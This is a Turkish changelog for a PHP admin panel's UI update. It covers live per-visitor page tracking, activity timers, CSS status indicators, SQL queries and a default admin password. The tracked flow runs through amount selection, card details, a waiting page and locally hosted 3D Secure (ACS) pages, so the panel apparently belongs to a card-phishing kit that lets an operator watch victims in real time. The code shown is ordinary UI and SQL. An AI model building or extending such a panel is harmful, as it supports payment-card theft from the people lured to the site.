# Admin Panel UI/UX Güncellemesi

## 🎯 Yapılan Değişiklikler

### 1. Kullanıcılar Sayfası (admin/pages/users.php)

#### Yeni Kolonlar
- **📍 Sayfa**: Kullanıcının şu an bulunduğu sayfa
- **⏱️ Son Aktivite**: Kaç saniye önce aktif olduğu

#### Görsel Özellikler
- **🟢 Canlı İndikatör**: Aktif kullanıcılar için yeşil yanıp sönen nokta
- **⚫ Offline İndikatör**: Pasif kullanıcılar için gri nokta
- **Sayfa İkonları**: Her sayfa için özel Font Awesome ikonu
- **Renk Kodlaması**: 
  - Online kullanıcılar: Yeşil (#2ecc71)
  - Offline kullanıcılar: Gri (#95a5a6)

#### Zaman Gösterimi
- **0.0s - 0.9s**: Ondalıklı saniye (örn: 0.5s)
- **1s - 59s**: Tam saniye (örn: 15s)
- **1m+**: Dakika (örn: 5m)
- **1h+**: Saat (örn: 2h)
- **1d+**: Gün (örn: 3d)

#### Time Badge Renkleri
- **Yeşil Badge**: 0-3 saniye arası (çok aktif)
- **Turuncu Badge**: 3+ saniye (yakın zamanda aktif)

#### Otomatik Yenileme
- **Süre**: 1 saniye
- **Görsel**: Dönen sync ikonu ile gösterilir
- **Manuel Yenileme**: Yenile butonu eklendi

---

### 2. Dashboard (admin/pages/dashboard.php)

#### Son Kullanıcılar Tablosu
- **📍 Sayfa Kolonu**: Kullanıcının bulunduğu sayfa
- **Durum İkonları**: 
  - 🟢 Online (son 5 saniye içinde aktif)
  - ⚫ Offline (5+ saniye önce aktif)
- **Sayfa İsimleri**: Kısa ve öz (Ana Sayfa, Tutar, Kart, Bekleme, 3D Secure, vb.)

---

### 3. API Güncellemeleri (api.php)

#### get_all_users Endpoint
```php
SELECT 
    u.*,
    o.current_page,
    o.last_activity,
    TIMESTAMPDIFF(MICROSECOND, o.last_activity, NOW()) / 1000000 as seconds_ago
FROM users u
LEFT JOIN online_users o ON u.user_identifier = o.user_identifier
    AND o.last_activity > DATE_SUB(NOW(), INTERVAL 5 MINUTE)
ORDER BY u.created_at DESC
```

#### Dönen Veriler
- **current_page**: Kullanıcının bulunduğu sayfa URL'i
- **last_activity**: Son aktivite zamanı (timestamp)
- **seconds_ago**: Kaç saniye önce aktif olduğu (float, mikrosaniye hassasiyetinde)

#### Collation Fix
- JOIN sorgularında `COLLATE utf8mb4_unicode_ci` kullanılıyor
- utf8mb4_general_ci ile utf8mb4_unicode_ci uyumsuzluğu çözüldü

---

## 📱 Sayfa İsimleri ve İkonları

| Sayfa | İsim | İkon |
|-------|------|------|
| `/index.php` | Ana Sayfa | 🏠 fas fa-home |
| `/screen2.php` | Tutar Seçimi | 📄 fas fa-file-alt |
| `/screen3.php` | Kart Bilgileri | 💳 fas fa-credit-card |
| `/bekle.php` | Bekleme | ⏳ fas fa-hourglass-half |
| `/success.php` | Başarılı | ✅ fas fa-check-circle |
| `/error_card.php` | Hata | ⚠️ fas fa-exclamation-triangle |
| `/acs/*.php` | 3D Secure | 🔒 fas fa-lock |
| `/3dredirect.php` | 3D Yönlendirme | 🛡️ fas fa-shield-alt |
| Offline | Offline | ⚫ fas fa-circle-notch |

---

## 🎨 CSS Stilleri

### Live Indicator (Yanıp Sönen Nokta)
```css
.live-indicator {
    display: inline-block;
    width: 8px;
    height: 8px;
    background: #2ecc71;
    border-radius: 50%;
    animation: pulse 2s infinite;
}

@keyframes pulse {
    0%, 100% { opacity: 1; transform: scale(1); }
    50% { opacity: 0.5; transform: scale(1.2); }
}
```

### Offline Indicator
```css
.offline-indicator {
    display: inline-block;
    width: 8px;
    height: 8px;
    background: #95a5a6;
    border-radius: 50%;
    opacity: 0.5;
}
```

### Time Badge
```css
.time-badge {
    display: inline-block;
    padding: 4px 8px;
    border-radius: 12px;
    font-size: 0.75rem;
    font-weight: 600;
}

.time-active {
    background: rgba(46, 204, 113, 0.1);
    color: #2ecc71;
}

.time-recent {
    background: rgba(243, 156, 18, 0.1);
    color: #f39c12;
}
```

---

## 🔄 Güncelleme Süreleri

| Bileşen | Süre | Açıklama |
|---------|------|----------|
| Tracking Heartbeat | 600ms | Kullanıcı tarafından gönderilen tracking verisi |
| Kullanıcılar Sayfası | 1 saniye | Admin panelde kullanıcı listesi güncelleme |
| Canlı Takip | 1 saniye | Online users ve guests sayfaları |
| Dashboard | 3 saniye | İstatistikler ve son kullanıcılar |
| Auto Cleanup | 5 dakika | Eski online_users kayıtlarının silinmesi |

---

## 📊 Kullanıcı Durumları

### Online Kriterleri
- **Aktif**: Son 5 saniye içinde aktivite
- **Yakın Zamanda**: 5+ saniye önce aktivite
- **Offline**: 5 dakika+ önce aktivite veya hiç aktivite yok

### Görsel Gösterim
```javascript
const isOnline = user.seconds_ago !== null && user.seconds_ago < 5;
```

---

## 🚀 Kullanım

### Admin Panele Giriş
1. `http://localhost/admin/` adresine git
2. Şifre: `admin123`
3. Kullanıcılar sayfasına git

### Canlı Takip
- Kullanıcılar sayfasında her kullanıcının:
  - Hangi sayfada olduğunu
  - Kaç saniye önce aktif olduğunu
  - Online/offline durumunu
  - Gerçek zamanlı olarak görebilirsiniz

### Manuel Yenileme
- Sağ üstteki "Yenile" butonuna tıklayın
- Veya sayfayı yenileyin (F5)

---

## 🔧 Teknik Detaylar

### JavaScript Fonksiyonlar

#### getPageIcon(page)
Sayfa URL'ine göre uygun Font Awesome ikonu döner.

#### getPageName(page)
Sayfa URL'ine göre Türkçe sayfa ismi döner.

#### formatTimeAgo(seconds)
Saniye değerini okunabilir formata çevirir (0.5s, 15s, 5m, 2h, 3d).

### Database Query
```sql
SELECT 
    u.*,
    o.current_page,
    o.last_activity,
    TIMESTAMPDIFF(MICROSECOND, o.last_activity, NOW()) / 1000000 as seconds_ago
FROM users u
LEFT JOIN online_users o 
    ON u.user_identifier COLLATE utf8mb4_unicode_ci = o.user_identifier COLLATE utf8mb4_unicode_ci
    AND o.last_activity > DATE_SUB(NOW(), INTERVAL 5 MINUTE)
ORDER BY u.created_at DESC
```

---

## ✅ Test

### Test Sayfaları
- `http://localhost/test_admin_ui.html` - UI güncellemeleri özeti
- `http://localhost/test_system.php` - Sistem testi
- `http://localhost/admin/?page=users` - Kullanıcılar sayfası

### Test Senaryosu
1. Bir tarayıcıda kullanıcı olarak siteye gir (index.php)
2. Başka bir tarayıcıda admin panele gir
3. Kullanıcılar sayfasında kullanıcının:
   - Yeşil nokta ile online olduğunu
   - "Ana Sayfa" yazdığını
   - "0.5s" gibi bir zaman gösterdiğini
   - Kontrol et

---

## 📝 Notlar

- Tüm zaman hesaplamaları mikrosaniye hassasiyetinde
- Collation uyumsuzlukları çözüldü
- Responsive tasarım mobil uyumlu
- Animasyonlar performans odaklı (CSS animations)
- Auto-refresh sayfa yenileme gerektirmiyor

---

**Son Güncelleme**: 12 Mart 2026
**Versiyon**: 2.1 (Enhanced UI/UX)
